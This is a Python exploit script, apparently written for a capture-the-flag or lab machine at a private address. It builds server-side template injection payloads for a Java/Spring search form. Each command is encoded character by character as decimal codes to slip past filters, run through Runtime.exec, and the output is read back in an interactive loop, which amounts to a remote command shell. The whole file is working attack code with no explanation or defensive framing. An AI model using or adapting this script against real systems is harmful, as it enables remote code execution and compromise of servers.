import urllib.parse
import argparse
import requests
import re, readline

URL = "http://10.129.32.51:8080/search"


parser = argparse.ArgumentParser(description="Generate SSTI payloads... One character at a time.")
parser.add_argument("-u", "--url-encode",action="store_true", help="URL Encode")
args = parser.parse_args()

url_encode = args.url_encode


def stti_decimal_encode(args):
    command = args

    decimals = []

    for i in command:
        decimals.append(str(ord(i)))

    payload = '''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[
        0]

    for i in decimals[1:]:
        line = '.concat(T(java.lang.Character).toString({}))'.format(i)
        payload += line

    payload += ').getInputStream())}'
    if url_encode:
        payload_encoded = urllib.parse.quote_plus(payload, safe='')
        return payload_encoded
    else:
        return payload


def beautyfy(txt):
    reg = re.sub(r'.*<h2 class="searched">You searched for:', '', txt, flags=re.DOTALL)
    reg = re.sub(r'\n</h2>.*', '', reg, flags=re.DOTALL)
    return reg

while True:
    stti = stti_decimal_encode(input("Enter command: "))
    readline.set_completer_delims(' ')
    r = requests.post(URL, data={'name': stti})
    print(beautyfy(r.text))
